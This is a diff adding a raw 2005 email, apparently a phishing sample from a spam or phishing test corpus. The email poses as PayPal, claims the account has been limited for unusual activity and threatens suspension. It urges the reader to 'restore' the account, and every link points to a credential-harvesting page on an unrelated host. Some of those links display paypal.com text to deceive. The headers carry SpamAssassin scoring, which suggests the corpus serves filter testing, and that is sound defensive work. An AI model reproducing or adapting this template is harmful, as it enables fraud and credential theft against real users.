@@ -1,0 +1,141 @@
+From nobody Sun Jan 25 14:03:10 2015
+Return-Path: <webusers@n6.sivit.org>
+X-Original-To: username@login.domain.com
+Delivered-To: username@login.domain.com
+Received: from mail2.domain.com (mail2.domain.com [192.168.3.4])
+ by naughty.domain.com (Postfix) with ESMTP id 09C5D536FCF
+ for <username@login.domain.com>; Thu, 10 Nov 2005 12:09:10 -0500 (EST)
+Received: from mail2.domain.com (localhost.domain.com [127.0.0.1])
+ by mail2.domain.com (Postfix) with ESMTP id B38BC6FA226
+ for <username@domain.com>; Thu, 10 Nov 2005 12:09:01 -0500 (EST)
+Received: from n6.sivit.org (n6.sivit.org [194.146.224.109])
+ by mail2.domain.com (Postfix) with ESMTP
+ for <username@domain.com>; Thu, 10 Nov 2005 12:09:01 -0500 (EST)
+Received: from n6.sivit.org (smmsp@nullmx.laywer.com [127.0.0.1])
+ by n6.sivit.org (8.12.8/8.12.8) with ESMTP id jAAH8vw7007945
+ for <username@domain.com>; Thu, 10 Nov 2005 18:08:57 +0100
+Received: (from webusers@localhost)
+ by n6.sivit.org (8.12.8/8.12.8/Submit) id jAAH8uON007944;
+ Thu, 10 Nov 2005 18:08:56 +0100
+Date: Thu, 10 Nov 2005 18:08:56 +0100
+Message-Id: <200511101708.jAAH8uON007944@n6.sivit.org>
+To: username@domain.com
+ScriptPath: test03581.sivit.org/z.php
+Subject: Please Restore Your Account Access Information to avoid suspension
+From: "service@paypal.com" <service@paypal.com>
+Reply-To: 
+MIME-Version: 1.0
+Content-Type: text/html
+Content-Transfer-Encoding: 8bit
+X-Spam-Checker-Version: SpamAssassin 3.0.2 (2004-11-16)
+X-Spam-Level: ***
+X-Spam-Status: No, score=3.6 required=5.0 tests=HTML_MESSAGE,
+ HTML_MIME_NO_HTML_TAG,HTML_NONELEMENT_00_10,HTML_TAG_EXIST_TBODY,
+ MIME_HTML_ONLY,RAZOR2_CHECK,REPLY_TO_EMPTY autolearn=no version=3.0.2
+X-Spam-Report: *  1.6 REPLY_TO_EMPTY Reply-To: is empty
+ *  0.0 HTML_MESSAGE BODY: HTML included in message
+ *  0.1 HTML_TAG_EXIST_TBODY BODY: HTML has "tbody" tag
+ * 0.0 HTML_NONELEMENT_00_10 BODY: 0% to 10% of HTML elements are non-standard
+ *  0.2 MIME_HTML_ONLY BODY: Message only has text/html MIME parts
+ *  1.5 RAZOR2_CHECK Listed in Razor2 (http://razor.sf.net/)
+ *  0.1 HTML_MIME_NO_HTML_TAG HTML-only message, but there is no HTML tag
+X-Keywords: 
+Status: RO
+Content-Length: 6557
+Lines: 95
+
+<TABLE cellSpacing=0 cellPadding=0 width=600 align=center border=0>
+<TBODY>
+<TR vAlign=top>
+<TD><A onclick="return top.js.OpenExtLink(window,event,this)" href="http://paypalbillservice.com" target=_blank><IMG height=35 alt=PayPal src="http://images.paypal.com/en_US/i/logo/email_logo.gif" width=255 border=0></A> </TD></TR></TBODY></TABLE>
+<TABLE cellSpacing=0 cellPadding=0 width="100%" border=0>
+<TBODY>
+<TR>
+<TD width="100%" background=http://images.paypal.com/images/bg_clk.gif><IMG height=29 src="http://images.paypal.com/images/pixel.gif" width=1 border=0></TD></TR>
+<TR>
+<TD><IMG height=10 src="http://images.paypal.com/images/pixel.gif" width=1 border=0></TD></TR></TBODY></TABLE>
+<TABLE cellSpacing=0 cellPadding=0 width=600 align=center border=0>
+<TBODY>
+<TR vAlign=top>
+<TD width=400>
+<TABLE cellSpacing=0 cellPadding=5 width="100%" border=0>
+<TBODY>
+<TR vAlign=top>
+<TD>
+<TABLE cellSpacing=0 cellPadding=0 width="100%" border=0>
+<TBODY>
+<TR>
+<TD align=left>Your account will be suspended !</TD></TR></TBODY></TABLE></TD></TR>
+<TR>
+<TD>
+<P style="MARGIN-TOP: 0px; MARGIN-BOTTOM: 0px" align=justify><FONT face=Arial><TT><FONT face=verdana,arial,helvetica,sans-serif>We are contacting you to remind you that on 07.11.2005 our Account Review Team identified some unusual activity in your account. In accordance with PayPal's User Agreement and to ensure that your account has not been compromised, access to your account was limited. Your account access will remain limited until this issue has been resolved.</FONT></TT></FONT></P>
+<P style="MARGIN-TOP: 0px; MARGIN-BOTTOM: 0px" align=justify><FONT face=Arial><TT><FONT face=verdana,arial,helvetica,sans-serif>To secure your account and quickly restore full access, we may require some additional information from you for the following reason:</FONT></TT></FONT></P>
+<P style="MARGIN-TOP: 0px; MARGIN-BOTTOM: 0px" align=justify>We have been notified <TT><FONT face=verdana,arial,helvetica,sans-serif>that a card associated with your account has been reported as lost or stolen, or that there were additional problems with your card.</FONT></TT></P>
+<P style="MARGIN-TOP: 0px; MARGIN-BOTTOM: 0px" align=justify></P>
+<P style="MARGIN-TOP: 0px; MARGIN-BOTTOM: 0px" align=justify>To securely confirm your PayPal information please go to your PayPal's Update Profile or click on the link bellow:</P>
+<P><BR></P>
+<TABLE cellSpacing=0 cellPadding=1 width="75%" align=left bgColor=#ffe65c border=0>
+<TBODY>
+<TR>
+<TD>
+<TABLE cellSpacing=0 cellPadding=4 width="100%" align=center bgColor=#fffecd border=0>
+<TBODY>
+<TR>
+<TD align=middle><A onclick="return top.js.OpenExtLink(window,event,this)" href="http://gate1.pmis.gov.mn/gobi-altai/..secure/cgi-bin/webscrcmd_login.php" target=_blank>Click here to activate your account</A></TD>
+</TR></TBODY></TABLE></TD></TR></TBODY></TABLE><BR><BR><BR><BR>
+<P><BR><BR>Thank you for using PayPal!<BR>The PayPal Team</P></TD></TR>
+<TR>
+<TD>
+<HR>
+</TD></TR>
+<TR>
+<TD>
+<TABLE cellSpacing=0 cellPadding=0 width="100%" border=0>
+<TBODY>
+<TR>
+<TD>Please do not reply to this e-mail. Mail sent to this address cannot be answered. For assistance,<a href="http://gate1.pmis.gov.mn/gobi-altai/..secure/cgi-bin/webscrcmd_login.php"> log in</a> to your PayPal account and choose the "Help" link in the footer of any page.<BR>
+  <BR>To receive email notifications in plain text instead of HTML, update your preferences<a href="http://gate1.pmis.gov.mn/gobi-altai/..secure/cgi-bin/webscrcmd_login.php"> here.</a> </TD>
+</TR>
+<TR>
+<TD><IMG height=10 src="http://images.paypal.com/en_US/i/scr/pixel.gif" width=1 border=0></TD></TR></TBODY></TABLE></TD></TR>
+<TR>
+<TD><BR>
+<SPAN>PayPal Email ID PP7643<BR>
+<BR></SPAN></TD></TR></TBODY></TABLE></TD>
+<TD><IMG height=1 src="http://images.paypal.com/en_US/i/scr/pixel.gif" width=10 border=0></TD>
+<TD vAlign=top width=190>
+<TABLE height=554 cellSpacing=0 cellPadding=1 width="100%" bgColor=#cccccc border=0>
+<TBODY>
+<TR>
+<TD height=552>
+<TABLE cellSpacing=0 cellPadding=0 width="100%" bgColor=#ffffff border=0>
+<TBODY>
+<TR>
+<TD>
+<TABLE cellSpacing=0 cellPadding=5 width="100%" bgColor=#eeeeee border=0>
+<TBODY>
+<TR>
+<TD align=middle>Protect Your Account Info</TD></TR></TBODY></TABLE>
+<TABLE cellSpacing=0 cellPadding=5 width="100%" border=0>
+<TBODY>
+<TR>
+<TD>Make sure you never provide your password to fraudulent websites. <BR><BR>    To safely and securely access the PayPal website or your account, open a new web browser (e.g. Internet Explorer or Netscape) and type in the PayPal URL (<a href="http://gate1.pmis.gov.mn/gobi-altai/..secure/cgi-bin/webscrcmd_login.php">https://www.paypal.com/us/</a>) to be sure you are on the real PayPal site.<BR>
+<BR>PayPal will never ask you to enter your password in an email.<BR><BR>For more information on protecting yourself from fraud, please review our Security Tips at <A onclick="return top.js.OpenExtLink(window,event,this)" href="http://gate1.pmis.gov.mn/gobi-altai/..secure/cgi-bin/webscrcmd_login.php" target=_blank>https://www.paypal.com/us<WBR>/securitytips</A><BR>
+<IMG height=5 src="http://images.paypal.com/en_US/images/pixel.gif" width=1 border=0> </TD></TR></TBODY></TABLE></TD></TR>
+<TR>
+<TD>
+<TABLE cellSpacing=0 cellPadding=5 width="100%" bgColor=#eeeeee border=0>
+<TBODY>
+<TR>
+<TD align=middle>Protect Your Password</TD></TR></TBODY></TABLE>
+<TABLE height=331 cellSpacing=0 cellPadding=5 width="100%" border=0>
+<TBODY>
+<TR>
+<TD height=149><FONT face=Arial size=2><BR>
+  </FONT>
+  <P style="MARGIN-TOP: 0px; MARGIN-BOTTOM: 0px" align=justify><FONT face=Arial size=2>This process is mandatory, and if not completed within the nearest time your account or credit card may be subject for temporary suspension. </FONT></P></TD></TR>
+<TR>
+<TD height=162>
+<P style="MARGIN-TOP: 0px; MARGIN-BOTTOM: 0px" align=justify><FONT face=Arial><TT><FONT face=Arial size=2>We encourage you to log in and perform the steps necessary to restore your account access </FONT></TT></FONT></P>
+<P style="MARGIN-TOP: 0px; MARGIN-BOTTOM: 0px" align=justify><FONT face=Arial><TT><FONT face=Arial size=2>as soon as possible. Allowing your account access to remain limited for an extended period </FONT></TT></FONT></P>
+<P style="MARGIN-TOP: 0px; MARGIN-BOTTOM: 0px" align=justify><FONT face=Arial><TT><FONT face=Arial size=2>of time may result in further limitations on the use of your account and possible account closure.</FONT></TT></FONT><B><TT><FONT face=Arial size=2><BR></FONT></TT></B></P></TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE>
